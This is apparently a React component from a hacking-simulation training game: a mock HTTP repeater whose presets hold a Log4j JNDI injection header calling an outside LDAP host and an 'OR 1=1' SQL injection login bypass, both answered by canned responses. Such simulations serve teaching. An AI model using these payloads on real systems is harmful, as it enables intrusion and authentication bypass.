import React, { useState } from 'react';
import { Send, Globe, RefreshCw, Zap, Code } from 'lucide-react';
import { soundManager } from '../audio/soundManager';
import { useGameStore } from '../store/gameStore';

interface HttpPreset {
  name: string;
  method: string;
  url: string;
  headers: string;
  body: string;
}

const PRESETS: HttpPreset[] = [
  {
    name: '1. E-Corp HR: Log4j JNDI Exploit',
    method: 'POST',
    url: 'http://10.10.11.45:80/api/v1/auth',
    headers: `Host: 10.10.11.45
User-Agent: \${jndi:ldap://10.10.14.22:1389/Exploit}
X-Api-Version: \${jndi:ldap://10.10.14.22:1389/Exploit}
Content-Type: application/json`,
    body: `{\n  "employeeId": "admin",\n  "password": "guest"\n}`,
  },
  {
    name: '2. IronBank: SQL Injection Auth Bypass',
    method: 'POST',
    url: 'http://10.10.11.82:8080/api/login',
    headers: `Host: 10.10.11.82
Content-Type: application/json`,
    body: `{\n  "username": "admin' OR 1=1 -- -",\n  "password": "none"\n}`,
  },
  {
    name: '3. Recon: Check Server Headers',
    method: 'GET',
    url: 'http://10.10.11.45:80/',
    headers: `Host: 10.10.11.45
User-Agent: Mozilla/5.0 (Kali Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml`,
    body: '',
  },
];

export const HttpRepeater: React.FC = () => {
  const { updateCompromiseLevel } = useGameStore();

  const [method, setMethod] = useState<string>('POST');
  const [url, setUrl] = useState<string>('http://10.10.11.45:80/api/v1/auth');
  const [headers, setHeaders] = useState<string>(PRESETS[0].headers);
  const [body, setBody] = useState<string>(PRESETS[0].body);

  const [loading, setLoading] = useState<boolean>(false);
  const [responseStatus, setResponseStatus] = useState<number | null>(null);
  const [responseHeaders, setResponseHeaders] = useState<string>('');
  const [responseBody, setResponseBody] = useState<string>('');
  const [renderHtml, setRenderHtml] = useState<boolean>(false);

  const handleSelectPreset = (preset: HttpPreset) => {
    soundManager.playKey();
    setMethod(preset.method);
    setUrl(preset.url);
    setHeaders(preset.headers);
    setBody(preset.body);
  };

  const handleSend = () => {
    soundManager.playKey();
    setLoading(true);

    setTimeout(() => {
      setLoading(false);

      // Check for Log4j exploit payload
      if (headers.includes('jndi:ldap') || body.includes('jndi:ldap') || headers.includes('jndi:rmi')) {
        soundManager.playConnect();
        updateCompromiseLevel('ecorp-hr', 'USER');
        setResponseStatus(200);
        setResponseHeaders(`HTTP/1.1 200 OK
Date: Thu, 29 Oct 2026 06:30:12 GMT
Server: Apache/2.4.49 (Unix) OpenSSL/1.1.1l
Content-Type: application/json;charset=UTF-8
Connection: close`);
        setResponseBody(`{
  "status": "PROCESSING",
  "audit": "Logged via Log4j v2.14.1 Enterprise Logger",
  "jndi_event": "JNDI Lookup to ldap://10.10.14.22:1389/Exploit resolved",
  "pwn_notice": "[+] Reverse TCP shell payload triggered on target container! Check your Pwnbox netcat listener on port 4444!"
}`);
        return;
      }

      // Check for SQLi payload
      if (body.includes("' OR 1=1") || body.includes("' OR '1'='1")) {
        soundManager.playConnect();
        updateCompromiseLevel('iron-vault', 'USER');
        setResponseStatus(200);
        setResponseHeaders(`HTTP/1.1 200 OK
Date: Thu, 29 Oct 2026 06:30:12 GMT
Server: Express / Node.js
Content-Type: application/json
Set-Cookie: auth_token=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiZmluYW5jZV9hZG1pbiJ9.; Path=/;`);
        setResponseBody(`{
  "success": true,
  "message": "Authentication bypassed! Logged in as system administrator (IronBank Vault).",
  "jwt": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiZmluYW5jZV9hZG1pbiJ9.",
  "flag": "ROOTRANGE{u53r_jwt_f0rg3ry_b4nk_l00t}"
}`);
        return;
      }

      // Default standard GET /
      if (method === 'GET' && url.includes('10.10.11.45')) {
        setResponseStatus(200);
        setResponseHeaders(`HTTP/1.1 200 OK
Date: Thu, 29 Oct 2026 06:30:12 GMT
Server: Apache/2.4.49 (Unix) OpenSSL/1.1.1l
Content-Type: text/html; charset=UTF-8
Content-Length: 480`);
        setResponseBody(`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>E-Corp Employee Portal</title>
</head>
<body style="font-family: sans-serif; background: #121212; color: #fff; padding: 20px;">
  <h2>E-Corp Internal HR Management System</h2>
  <p>Notice: All login attempts are recorded using our centralized Log4j enterprise auditing engine.</p>
  <hr/>
  <form>
    <label>Employee ID:</label><br/>
    <input type="text" name="empId" style="padding: 5px; margin-bottom: 10px;" /><br/>
    <label>Password:</label><br/>
    <input type="password" name="pwd" style="padding: 5px;" /><br/>
    <button type="submit" style="margin-top: 10px; padding: 5px 15px;">Login</button>
  </form>
</body>
</html>`);
        return;
      }

      // 404 or connection failure
      setResponseStatus(404);
      setResponseHeaders(`HTTP/1.1 404 Not Found\nServer: Apache\nContent-Type: text/plain`);
      setResponseBody('Error 404: The requested resource was not found on this virtual machine.');
    }, 450);
  };

  return (
    <div className="flex flex-col h-full bg-[#070a0f] border border-slate-800 rounded-lg overflow-hidden font-mono shadow-2xl">
      {/* Top Bar with Presets */}
      <div className="flex items-center justify-between px-4 py-2 bg-[#0e141f] border-b border-slate-800 text-xs">
        <div className="flex items-center space-x-2">
          <Globe className="w-4 h-4 text-cyan-400" />
          <span className="font-bold text-slate-200 uppercase tracking-wider">
            // IN-BROWSER HTTP PROXY & REPEATER
          </span>
        </div>

        {/* Attack Presets */}
        <div className="flex items-center space-x-2 text-[11px]">
          <span className="text-slate-500 font-bold flex items-center gap-1">
            <Zap className="w-3 h-3 text-amber-400" /> PRESETS:
          </span>
          {PRESETS.map((p, i) => (
            <button
              key={i}
              onClick={() => handleSelectPreset(p)}
              className="px-2 py-0.5 rounded bg-slate-900 border border-slate-800 hover:border-cyan-500/60 text-slate-300 hover:text-cyan-300 text-[10px]"
            >
              {p.name}
            </button>
          ))}
        </div>
      </div>

      {/* URL & Method Input Bar */}
      <div className="flex items-center px-4 py-2 bg-[#0a0f17] border-b border-slate-800/80 space-x-2">
        <select
          value={method}
          onChange={(e) => setMethod(e.target.value)}
          className="bg-slate-900 border border-slate-700 text-emerald-400 font-bold text-xs rounded px-2 py-1 outline-none focus:border-emerald-500"
        >
          <option value="GET">GET</option>
          <option value="POST">POST</option>
          <option value="PUT">PUT</option>
          <option value="DELETE">DELETE</option>
          <option value="HEAD">HEAD</option>
        </select>

        <input
          type="text"
          value={url}
          onChange={(e) => setUrl(e.target.value)}
          placeholder="http://10.10.11.45/api..."
          className="flex-1 bg-slate-900 border border-slate-800 text-slate-100 text-xs rounded px-3 py-1 outline-none focus:border-cyan-500 font-mono"
        />

        <button
          onClick={handleSend}
          disabled={loading}
          className="flex items-center space-x-1.5 px-4 py-1 rounded bg-emerald-600 hover:bg-emerald-500 text-black font-bold text-xs transition shadow-lg shadow-emerald-950/40 disabled:opacity-50"
        >
          {loading ? <RefreshCw className="w-3.5 h-3.5 animate-spin" /> : <Send className="w-3.5 h-3.5" />}
          <span>{loading ? 'SENDING...' : 'SEND'}</span>
        </button>
      </div>

      {/* Main Split Panels: Request vs Response */}
      <div className="flex-1 grid grid-cols-2 divide-x divide-slate-800/80 overflow-hidden">
        {/* Left: Request Editor */}
        <div className="flex flex-col h-full bg-[#070a0f] p-3 space-y-2 overflow-hidden">
          <div className="flex items-center justify-between text-[11px] text-slate-400 font-bold border-b border-slate-800 pb-1">
            <span>REQUEST HEADERS</span>
            <span className="text-[10px] text-slate-600">INSPECT & INJECT PAYLOADS</span>
          </div>
          <textarea
            value={headers}
            onChange={(e) => setHeaders(e.target.value)}
            rows={5}
            className="w-full bg-[#0a0f17] border border-slate-800 text-slate-300 font-mono text-xs p-2 rounded outline-none focus:border-cyan-500/60 resize-none"
            spellCheck={false}
          />

          <div className="flex items-center justify-between text-[11px] text-slate-400 font-bold border-b border-slate-800 pb-1 pt-1">
            <span>REQUEST BODY (PAYLOAD)</span>
            <span className="text-[10px] text-slate-600">JSON / FORM-DATA</span>
          </div>
          <textarea
            value={body}
            onChange={(e) => setBody(e.target.value)}
            className="flex-1 w-full bg-[#0a0f17] border border-slate-800 text-slate-300 font-mono text-xs p-2 rounded outline-none focus:border-cyan-500/60 resize-none"
            spellCheck={false}
          />
        </div>

        {/* Right: Response Inspector */}
        <div className="flex flex-col h-full bg-[#070a0f] p-3 space-y-2 overflow-hidden">
          <div className="flex items-center justify-between text-[11px] text-slate-400 font-bold border-b border-slate-800 pb-1">
            <div className="flex items-center space-x-2">
              <span>RESPONSE</span>
              {responseStatus && (
                <span
                  className={`px-2 py-0.5 rounded text-[10px] font-bold ${
                    responseStatus === 200
                      ? 'bg-emerald-950 text-emerald-400 border border-emerald-800'
                      : 'bg-red-950 text-red-400 border border-red-800'
                  }`}
                >
                  {responseStatus} OK
                </span>
              )}
            </div>

            {/* Toggle Raw vs Rendered HTML */}
            <div className="flex items-center space-x-1">
              <button
                onClick={() => setRenderHtml(false)}
                className={`px-2 py-0.5 rounded text-[10px] ${!renderHtml ? 'bg-slate-800 text-white' : 'text-slate-500'}`}
              >
                RAW
              </button>
              <button
                onClick={() => setRenderHtml(true)}
                className={`px-2 py-0.5 rounded text-[10px] ${renderHtml ? 'bg-slate-800 text-white' : 'text-slate-500'}`}
              >
                RENDER HTML
              </button>
            </div>
          </div>

          {responseHeaders && (
            <pre className="text-[10px] text-slate-400 bg-[#090d14] p-2 rounded border border-slate-800/80 overflow-x-auto max-h-24 select-text">
              {responseHeaders}
            </pre>
          )}

          <div className="flex-1 bg-[#090d14] border border-slate-800 rounded p-2 overflow-y-auto select-text text-xs">
            {responseBody ? (
              renderHtml ? (
                <div
                  className="bg-white text-black p-4 rounded h-full overflow-y-auto"
                  dangerouslySetInnerHTML={{ __html: responseBody }}
                />
              ) : (
                <pre className="text-emerald-400 whitespace-pre-wrap font-mono leading-relaxed">
                  {responseBody}
                </pre>
              )
            ) : (
              <div className="flex flex-col items-center justify-center h-full text-slate-600 text-center space-y-2">
                <Code className="w-8 h-8 opacity-40" />
                <span>Ready to intercept & replay HTTP requests.</span>
                <span className="text-[10px]">Select a preset or click SEND to fire payloads.</span>
              </div>
            )}
          </div>
        </div>
      </div>
    </div>
  );
};
